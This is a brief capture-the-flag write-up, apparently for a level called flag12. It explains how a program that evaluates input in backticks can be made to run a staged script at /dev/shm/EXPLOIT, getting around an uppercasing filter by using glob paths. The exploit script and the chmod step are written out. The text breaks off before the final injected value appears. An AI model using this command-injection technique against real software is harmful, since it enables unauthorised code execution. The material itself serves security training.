# The program uses backticks to evaluate a shellscript
# We can exploit that by making it evaluate our script contained in the $xx variable
# The regex will capitalize the x argument and delete anything after a space
# we can't directly write x="`getflag>/tmp/token`" which would be translated as x="`GETFLAG>/TMP/TOKEN`" (as Linux is case-sensitive)
# Instead we will write a file that will get executed

$> cat /dev/shm/EXPLOIT
#!/bin/sh
getflag > /tmp/flag12

$> chmod +x /dev/shm/EXPLOIT

# We use globbing to write path (see above why)
